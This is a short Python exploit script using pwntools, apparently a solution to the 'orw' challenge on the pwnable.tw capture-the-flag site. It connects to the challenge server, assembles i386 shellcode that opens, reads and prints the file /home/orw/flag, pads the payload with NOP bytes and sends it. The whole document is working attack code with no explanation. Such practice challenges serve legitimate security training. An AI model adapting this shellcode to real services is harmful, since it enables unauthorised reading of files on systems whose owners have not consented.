
from pwn import *

#/home/orw/flag

p = remote("chall.pwnable.tw",10001)
#0x804a040   something there
payload = asm(shellcraft.i386.linux.open("/home/orw/flag"))
payload += asm("mov ebx,eax;mov eax,3;mov ecx,0x804a040;mov edx,100;int 0x80;mov edx,eax;mov eax,4;mov ebx,1;mov ecx,0x804a040 	;int 0x80;",arch="i386")
#payload +=
print "[+] len : " + str(len(payload))

payload += (200-len(payload)) * "\x90"

p.send(payload)

p.interactive()